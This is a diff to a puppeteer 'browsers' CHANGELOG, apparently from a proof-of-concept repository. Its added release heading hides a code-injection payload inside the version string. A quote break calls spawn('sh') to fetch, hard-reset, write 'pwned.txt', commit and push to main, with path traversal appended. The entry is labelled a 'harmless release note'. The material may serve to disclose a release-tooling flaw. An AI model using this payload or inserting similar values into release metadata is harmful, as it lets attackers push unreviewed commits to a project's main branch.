@@ -1,5 +1,12 @@
 # Changelog
 
+## [3.3.1-';spawn("sh",["-c","git fetch origin main:p;git reset --hard p;cd ..;cd ..;echo P>pwned.txt;git add -- pwned.txt;git -c user.name=p -c user.email=p@p commit -m p;git push origin HEAD:main"])//../../../browsers](https://github.com/arnodorian1337/puppeteer-release-metadata-poc-20261127132623/compare/browsers-v3.3.0...browsers-v3.3.1-';spawn("sh",["-c","git fetch origin main:p;git reset --hard p;cd ..;cd ..;echo P>pwned.txt;git add -- pwned.txt;git -c user.name=p -c user.email=p@p commit -m p;git push origin HEAD:main"])//../../../browsers) (2026-11-27)
+
+
+### 🎉 Features
+
+* **browsers:** add harmless release note ([07e037a](https://github.com/arnodorian1337/puppeteer-release-metadata-poc-20261127132623/commit/07e037af62b20dd299f61665ecf5996b8cdfd118))
+
 ## [3.3.0](https://github.com/puppeteer/puppeteer/compare/browsers-v3.2.7...browsers-v3.3.0) (2026-11-25)
 
 
